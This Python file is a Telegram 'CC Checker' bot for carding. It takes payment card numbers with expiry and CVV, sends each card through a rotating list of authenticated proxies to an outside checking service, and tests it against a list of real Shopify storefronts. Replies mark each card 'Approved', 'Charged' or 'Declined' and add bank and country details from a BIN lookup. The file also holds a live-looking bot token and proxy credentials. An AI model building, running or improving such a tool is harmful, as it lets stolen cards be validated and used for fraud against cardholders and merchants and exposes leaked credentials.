import re
import time
import threading
import random
import urllib.parse
import requests
import telebot
from typing import List

# ===================== CONFIG =====================
BOT_TOKEN = "8854554558:AAGKqtF4BimDmTLbXqy9_czvHEvr5iMNse8"

shop_urls = [
    "https://52a07b-2.myshopify.com",
    "https://6sbibg-yh.myshopify.com",
    "https://7pxptt-gn.myshopify.com",
    "https://7zzbrn-ch.myshopify.com",
    "https://a5qrze-bz.myshopify.com",
    "https://ajs-55743.myshopify.com",
    "https://ajvv.myshopify.com",
    "https://ak24pz-na.myshopify.com",
    "https://al-furqans-perfumes-and-beauty.myshopify.com",
    "https://allthingsbykeisha.myshopify.com",
    "https://amneue.myshopify.com",
    "https://animolds.myshopify.com",
    "https://anjoly30-boutique.myshopify.com",
    "https://antarctic-press.myshopify.com",
    "https://apexmarket-store.myshopify.com",
    "https://apkbridal.myshopify.com",
    "https://boldwritst-store.myshopify.com",
    "https://brand-x-electrical.myshopify.com",
    "https://brandalees-bargains.myshopify.com",
    "https://burlap-kitchen.myshopify.com",
]

# ===================== PROXY CONFIG (ONLY FRESH mk PROXIES) =====================
proxy_list = [
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.53.53:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.61.81:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.53.138:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.56.122:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.11.55:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.254.103:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.47.157:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.7.40:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.236.79:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.53.119:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.24.176:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.41:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.6.30:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.49.115:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.8.182:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.44.86:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.33.153:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.53.128:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.210:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.191.46:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.247.90:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.42.165:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.42.229:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.36.62:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.4.81:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.51.18:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.238.156:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.231.207:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.44.236:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.235.64:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.49.160:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.8.190:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.26.92:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.4.194:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.51.100:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.237.252:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.30.133:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.235.140:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.20.122:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.2.57:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.35.3:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.4.118:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.47.34:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.50.94:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.236.42:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.3.219:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.167.19.47:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.46:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.43.81:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.20.160:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@193.56.28.129:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.179.180:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.246.4:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.232.64:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.27.154:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.40.176:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.225.210:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.38.196:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.239.30:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.63.59:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.58.225:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.37.104:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.190.145:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.240.149:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.59.44:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.253.56:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.42.128:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.36.225:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.178.73:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.30.50:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.53.40:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.253.22:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.34.36:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.185.241:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.62.142:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.51.81:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.10.240:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.49.66:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.186.71:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.50.182:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.31.128:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.27.180:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.2.71:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.34.50:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@217.181.92.45:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.12.207:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.7.123:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@217.181.90.94:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.161.174:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.166.223:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.32.173:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.186.176:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@216.26.234.112:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.8.72:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@104.207.40.24:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@45.3.42.114:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.177.66:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.186.68:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@65.111.0.98:3129",
    "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.181.80:3129"
]

bot = telebot.TeleBot(BOT_TOKEN)
user_check_in_progress = {}
last_check_time = {}

# ===================== UTILITY FUNCTIONS =====================
def is_valid_card(card: str) -> bool:
    parts = card.split('|')
    if len(parts) != 4:
        return False
    cc, mm, yy, cvv = parts
    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return False
    if not mm.isdigit() or len(mm) != 2:
        return False
    if not yy.isdigit() or len(yy) not in [2, 4]:
        return False
    if not cvv.isdigit() or len(cvv) not in [3, 4]:
        return False
    return True

def esc(t):
    return str(t).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

def bin_lookup(bin_code):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_code}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("brand", "N/A"),
                "type": data.get("type", "N/A"),
                "level": data.get("level", "N/A"),
                "bank": data.get("bank", "N/A"),
                "country": data.get("country_name", "N/A"),
                "country_emoji": data.get("country_flag", "ðŸ³ï¸")
            }
    except:
        pass
    return {
        "brand": "N/A",
        "type": "N/A",
        "level": "N/A",
        "bank": "N/A",
        "country": "N/A",
        "country_emoji": "ðŸ³ï¸"
    }

def format_result(card, api_json, user, user_id, elapsed):
    gateway = api_json.get("Gateway", "Shopify Normal")
    status = api_json.get("Status", api_json.get("status", "Unknown"))
    response_msg = api_json.get("Response", api_json.get("response", ""))
    amount_raw = (
        api_json.get("Amount")
        or api_json.get("amount")
        or api_json.get("price")
        or api_json.get("Price")
    )
    try:
        amount_value = float(str(amount_raw).replace("$", "").strip())
        amount = f"${amount_value:.2f}"
    except:
        amount = "N/A"

    bin_code = card.split('|')[0][:6]
    bininfo = bin_lookup(bin_code)

    status_lower = str(status).lower()
    response_lower = str(response_msg).lower()
    declined_phrases = [
        "declined", "card_declined", "authorization_error", "authentication_failed",
        "do_not_honor", "pick_up_card", "pickup_card", "stolen_card", "lost_card",
        "incorrect_number", "expired_card", "processing_error", "fraudulent",
        "generic_error", "fraud_suspected", "invalid_payment_error", "amount_too_small"
    ]

    if any(x in status_lower or x in response_lower for x in declined_phrases):
        status_str = "ðƒðžðœð¥ð¢ð§ðžð âŒ"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "3d", "authentication", "3d secure", "OTP_REQUIRED", "3ds", "otp", "verify", "verification"
    ]):
        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
        response_show = response_msg
    elif "insufficient" in response_lower or "low funds" in response_lower:
        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
        response_show = response_msg
    elif "incorrect_zip" in response_lower:
        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "incorrect cvc", "invalid cvc", "incorrect cvv", "incorrect_cvc",
        "INSUFFICIENT_FUNDS", "invalid cvv", "incorrect security code",
        "invalid security code"
    ]):
        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "thank you", "order placed", "charged", "â¤¿ORDER_PAIDâ¤¾",
        "successfully paid", "payment successful"
    ]):
        status_str = "ð‚ð¡ðšð«ð ðžð ðŸ’Ž"
        response_show = response_msg
    else:
        approved_phrases = ["approved", "charged", "success", "live", "approved!"]
        is_approved = any(p in status_lower for p in approved_phrases)
        status_str = f"{esc(status)} {'âœ…' if is_approved else 'âŒ'}"
        response_show = response_msg

    link = "https://t.me/NIKSHACKS"
    b = lambda t: f"<b>{t}</b>"
    m = lambda t: f"<code>{t}</code>"
    ks = f'<a href="{link}">ÏŸ</a>'
    su = f'<a href="{link}">ã‚¹</a>'
    curl = f'<a href="{link}">âŒ¯</a>'

    text = (
        f"{b('#Shopi | Luffy [/sh]')}\n"
        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
        f"{b(f'[{ks}] Card:')} {m(card)}\n"
        f"{b(f'[{ks}] Gateway:')} {m(f'{gateway} {amount}')}\n"
        f"{b(f'[{ks}] Status:')} {m(esc(status_str))}\n"
        f"{b(f'[{ks}] Response:')} {m(esc(response_show))}\n"
        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
        f"{b(f'[{curl}] Bin:')} {m(bin_code)}\n"
        f"{b(f'[{curl}] Info:')} {m(bininfo['brand'] + ' - ' + bininfo['type'] + ' - ' + bininfo['level'])}\n"
        f"{b(f'[{curl}] Bank:')} {m(bininfo['bank'])}\n"
        f"{b(f'[{curl}] Country:')} {m(bininfo['country'] + ' - ' + bininfo['country_emoji'])}\n"
        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
        f'{b(f"[{su}] Checked By:")} <a href="tg://user?id={user_id}">{esc(user)}</a>\n'
        f"{b(f'[{su}] Dev:')} <a href=\"tg://user?id=8570832903\">Luffy - â˜˜ï¸</a>\n"
        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
        f"{b(f'[{ks}] T/t:')} {m(f'[{elapsed:.2f}sec] | P/x: [Live ðŸŒ¥]')}"
    )
    return text

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'\b(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b',
        r'\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{4})-(\d{4})-(\d{4})-(\d{4})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
        r'^(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{4})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                cc, mm, yy, cvv = match
                mm = mm.zfill(2)
                if len(yy) == 4:
                    yy = yy[2:]
                card_string = f"{cc}|{mm}|{yy}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards

# ===================== BOT COMMAND HANDLERS =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the CC Checker Bot! Use /sh to check a card.")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/sh') or m.text.startswith('.sh')))
def check_card(message):
    uid = str(message.from_user.id)
    username = (message.from_user.username or "").lower()

    if user_check_in_progress.get(uid, False):
        bot.reply_to(message, "â³ á´˜ÊŸá´‡á´€êœ±á´‡ á´¡á´€Éªá´›: Êá´á´œÊ€ ÊŸá´€êœ±á´› á´„Êœá´‡á´„á´‹ Éªêœ± êœ±á´›ÉªÊŸÊŸ á´˜Ê€á´á´„á´‡êœ±êœ±ÉªÉ´É¢.")
        return

    now = time.time()
    last_end = last_check_time.get(uid, 0)
    cooldown = 0
    if now - last_end < cooldown:
        wait_sec = int(cooldown - (now - last_end))
        bot.reply_to(message, f"â³ á´¡ÊœÊ êœ±á´ Êœá´œÊ€Ê€Ê? á´¡á´€Éªá´› {wait_sec}sâ€¦")
        return

    user_check_in_progress[uid] = True

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "âŒ á´œêœ±á´€É¢á´‡: /êœ±Êœ [á´„á´„|á´á´|ÊÊ|á´„á´ á´ ]")
        user_check_in_progress[uid] = False
        return

    card = args[1].replace(" ", "")
    if not is_valid_card(card):
        bot.reply_to(message, "âŒ ÉªÉ´á´ á´€ÊŸÉªá´… á´„á´€Ê€á´… êœ°á´Ê€á´á´€á´›. á´œêœ±á´‡ á´„á´„|á´á´|ÊÊ|á´„á´ á´ ")
        user_check_in_progress[uid] = False
        return

    status_msg = bot.reply_to(message, "Êá´á´œÊ€ Ê€á´‡Qá´œá´‡êœ±á´› Ê€á´‡á´„á´‡Éªá´ á´‡á´…!")
    t0 = time.time()

    def process_check():
        try:
            max_attempts = 3
            last_error = None
            response = None

            for attempt in range(max_attempts):
                try:
                    proxy_raw = random.choice(proxy_list)
                    proxy_url = f"http://{proxy_raw}"
                    proxy_param = urllib.parse.quote(proxy_url, safe='')

                    shop_url = random.choice(shop_urls)
                    api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy_param}"

                    # No outer proxy â€“ the proxy is only passed as a parameter
                    response = requests.get(api_url, timeout=30)
                    break
                except Exception as e:
                    last_error = e
                    if attempt == max_attempts - 1:
                        raise
                    time.sleep(1)

            try:
                api_json = response.json()
            except Exception:
                api_json = {"Response": response.text}

            elapsed = time.time() - t0
            user_display = message.from_user.username or message.from_user.first_name
            result_text = format_result(
                card, api_json,
                user=user_display,
                user_id=message.from_user.id,
                elapsed=elapsed
            )

            bot.edit_message_text(
                result_text,
                chat_id=status_msg.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )

        except Exception as e:
            bot.edit_message_text(
                f"âŒ Error: {str(e)}",
                chat_id=status_msg.chat.id,
                message_id=status_msg.message_id
            )
        finally:
            user_check_in_progress[uid] = False
            last_check_time[uid] = time.time()

    threading.Thread(target=process_check, daemon=True).start()

# ===================== BOT POLLING =====================
if __name__ == "__main__":
    print("Bot started...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
